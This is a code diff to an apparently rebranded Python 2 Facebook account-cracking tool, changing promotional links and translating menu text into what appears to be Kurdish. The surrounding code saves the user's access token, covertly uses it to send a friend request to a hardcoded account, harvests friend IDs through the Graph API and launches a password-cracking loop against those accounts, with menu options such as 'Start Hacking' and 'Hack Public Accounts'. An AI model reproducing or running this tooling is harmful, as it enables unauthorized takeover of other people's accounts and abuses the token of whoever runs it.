@@ -106,10 +106,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;96mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+            os.system('xdg-open https://www.instagram.com/amin_malake/')
     else:
         print "\033[1;96mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+        os.system('xdg-open https://www.instagram.com/amin_malake/')
 
 def login():
 	os.system('clear')
@@ -150,7 +150,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
-				os.system('xdg-open https://www.youtube.com/channel/UCe6wmIybCxpRSB4o6pozMOA')
+				os.system('xdg-open https://www.instagram.com/amin_malake/')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -202,9 +202,9 @@ def menu():
 	print "\033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "\033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "\033[1;36;40m      ╚═════════════════════════════════╝"
-	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Start Hacking"	
-	print "    \033[1;32;40m[type2] \033[1;33;40m‹•.•›Update"																														
-	print "    \033[1;32;40m[type0] \033[1;33;40m‹•.•›Logout"
+	print "    \033[1;32;40m[Type1] \033[1;33;40m‹•.•›Dast pee krdn ba Hack"	
+	print "    \033[1;32;40m[type2] \033[1;33;40m‹•.•›Updat krdni tool"																														
+	print "    \033[1;32;40m[type0] \033[1;33;40m‹•.•›Chuna dar"
 	pilih()
 
 def pilih():
@@ -241,9 +241,9 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95m>_<Clone Friend List."
-	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m>_<Hack Public Accounts ."
-	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m>_<Back"
+	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95m>_<Hack krdm la regay frienda wa."
+	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m>_<Hack krdn la regay ID wa ."
+	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m>_<Chuna dar"
 	pilih_super()
 
 def pilih_super():
@@ -255,7 +255,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print "\033[1;97m•◈•═══\033[1;91mAMIN-MALAKE\033[1;97m═══•◈•"
-		jalan('\033[1;91mGetting IDs \033[1;91m...')
+		jalan('\033[1;91mDast kawtni ID \033[1;91m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -264,7 +264,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;95m•◈•══════•◈\033[1;91mAMIN-KHAN-MALAKE\033[1;95m◈•══════•◈•"
+		print "\033[1;95m•◈•══════•◈\033[1;91mAMIN_MALAKE\033[1;95m◈•══════•◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -289,10 +289,10 @@ def pilih_super():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
-	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
+	print "\n\033[1;94m        ❈     \x1b[1;94mBo wastandn CTRL+Z dabgra \033[1;94m    ❈"
 	print "   \033[1;92m◄══════════════════💥══════════════════►"
 
-	jalan('          \033[1;91mAMIN X MALAKE Dast pekrdn ba crack tkaya buasta...')
+	jalan('          \033[1;91mAMIN X MALAKE Dast pekrdn ba crack ...')
 	print  "  \033[1;92m ◄══════════════════💥══════════════════►" 
 
 	def main(arg):
